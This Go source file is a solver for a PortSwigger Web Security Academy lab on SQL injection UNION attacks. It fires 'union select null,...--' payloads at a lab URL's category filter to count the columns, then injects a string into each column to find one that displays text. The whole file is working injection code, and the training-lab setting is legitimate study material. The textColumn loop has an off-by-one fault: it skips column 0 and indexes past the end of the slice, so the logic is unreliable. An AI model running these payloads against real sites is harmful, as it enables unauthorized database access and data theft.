// https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

package main

import (
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"log"
	"net/url"
	"strings"
	"regexp"
	"io"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ab600bc04ecdd4cc0821d3e00ff007a.web-security-academy.net/filter"

	str, err := outputString(u, client)
	if err != nil {
		return err
	}
	fmt.Println(str)

	numCols, err := numColumns(u, client)
	if err != nil {
		return err
	}
	fmt.Println(numCols)

	textCol, err := textColumn(u, numCols, str, client)
	if err != nil {
		return err
	}
	fmt.Println(textCol)

	return nil
}

func numColumns(u string, client *http.Client) (int, error) {
	for i := 1; i <= 20; i++ {
		nulls := make([]string, i)
		for j := 0; j < len(nulls); j++ {
    			nulls[j] = "null"
		}

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select " + strings.Join(nulls, ",") + "--")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode / 100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("greater than 20")
}

func textColumn(u string, max int, str string, client *http.Client) (int, error) {
	for i := 1; i <= max; i++ {
		nulls := make([]string, max)
		for j := 0; j < len(nulls); j++ {
    			nulls[j] = "null"
		}
    		nulls[i] = "'"+str+"'"

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select " + strings.Join(nulls, ",") + "--")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode / 100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("text column not found")
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}


var outputStringRE *regexp.Regexp = regexp.MustCompile(`Make the database retrieve the string: '([^']+)'`)

func outputString(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode / 100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))
	
	matches := outputStringRE.FindSubmatch(body)
	if len(matches) != 2 {
		return "", fmt.Errorf("output string not found")
	}

	return string(matches[1]), nil
}


